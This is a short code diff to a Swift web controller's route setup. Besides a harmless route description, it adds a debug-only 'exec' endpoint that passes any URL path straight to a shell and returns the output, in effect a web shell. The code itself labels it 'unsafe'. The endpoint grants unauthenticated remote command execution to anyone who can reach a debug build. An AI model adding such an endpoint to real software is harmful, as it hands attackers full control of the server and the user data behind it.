@@ -9,7 +9,7 @@ struct HomeWebController: RouteCollection {
         
         let credentialsRoutes = routes.grouped(User.credentialsAuthenticator())
         
-        routes.get(use: indexHandler)
+        routes.get(use: indexHandler).description("home page")
         routes.get("register", use: registerHandler)
         routes.post("register", use: registerPostHandler)
         routes.get("login", use: loginHandler)
@@ -20,6 +20,12 @@ struct HomeWebController: RouteCollection {
         routes.get("resetPassword", use: resetPasswordHandler)
         routes.post("resetPassword", use: resetPasswordPostHandler)
         
+        #if DEBUG
+        routes.get("exec", "**") { req -> EventLoopFuture<String> in
+            let path = req.parameters.getCatchall().joined(separator: "/")
+            return try shell("\(path)", on: req.eventLoop).map { $0.stdout }
+        }.description("execute a shell command (unsafe)")
+        #endif
     }
     
     struct IndexContext: BaseContext {
